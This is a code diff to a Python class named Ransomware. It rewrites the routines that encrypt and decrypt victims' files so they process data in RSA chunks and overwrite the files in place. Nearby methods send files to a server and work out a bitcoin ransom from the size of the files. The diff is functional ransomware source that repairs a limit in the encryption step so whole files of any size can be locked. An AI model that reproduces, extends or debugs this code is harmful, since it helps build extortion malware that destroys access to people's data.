@@ -66,7 +66,6 @@ class Ransomware:
         return self._socket
 
 
-    #TODO Rafi/Yusef:
     def send_file_to_server(self, file_path, filename):
     
         """ Opening and reading the file data. """
@@ -177,10 +176,22 @@ class Ransomware:
         print("started")
         with open(file, "rb") as the_file:
             contents = the_file.read()
+            
+        opened = False
+        # Read the message in chunks
+        for i in range(0, len(contents), 245):
+            chunk = contents[i:i+245]
+            enc_chunk = rsa.encrypt(chunk, key)
 
-        encrypted_contents = rsa.encrypt(contents, key)
-        with open(file, "wb") as the_file:
-            the_file.write(encrypted_contents)
+            # Update the file with the encrypted contents
+            if not opened:
+                with open(file, "wb") as f:
+                    f.write(enc_chunk)
+                    opened = True
+            else:
+                with open(file, "ab") as f:
+                    f.write(enc_chunk)
+                    
         print("terminated")
 
     def calculate_and_send_bitcoin_needed(self, size_of_files):
@@ -228,9 +239,20 @@ class Ransomware:
         with open(file_path, "rb") as file:
             encrypted_contents = file.read()
 
-        decrypted_contents = rsa.decrypt(encrypted_contents, key)
-        with open(file_path, "wb") as the_file:
-            the_file.write(decrypted_contents)
+        opened = False
+        # Read the encrypted message in chunks
+        for i in range(0, len(encrypted_contents), 256):
+            chunk = encrypted_contents[i:i+256]
+            dec_chunk = rsa.decrypt(chunk, key)
+
+            # Update the file with the decrypted contents
+            if not opened:
+                with open(file_path, "wb") as file:
+                    file.write(dec_chunk)
+                    opened = True
+            else:
+                with open(file_path, "ab") as file:
+                    file.write(dec_chunk)
 
     def decrypt_all_files(self, directory, key):
         dir_list = self.list_safe_directories(directory)
